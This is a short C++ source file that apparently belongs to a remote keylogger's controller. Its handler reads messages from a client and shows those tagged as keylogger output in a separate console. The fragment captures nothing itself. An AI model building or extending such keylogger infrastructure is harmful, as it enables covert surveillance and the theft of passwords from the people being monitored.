#include "answerFromClient.h"

void AnswerFromClient::coordinator()
{
	std::string prepos;
	prepos = _answer.substr(0, 2);
	_answer.erase(0, 2);

	if (prepos.compare("0$") == 0) //KEYLOGGER
	{
		_keyloggerConsole.cprintf(CConsoleLoggerEx::COLOR_GREEN, _answer.c_str());
		_keyloggerConsole.cprintf(" ");
	}
	else if (prepos.compare("$$") == 0)
	{
		if (DEBUG)
			std::cout << "Client Destructor!" << std::endl;
	}
}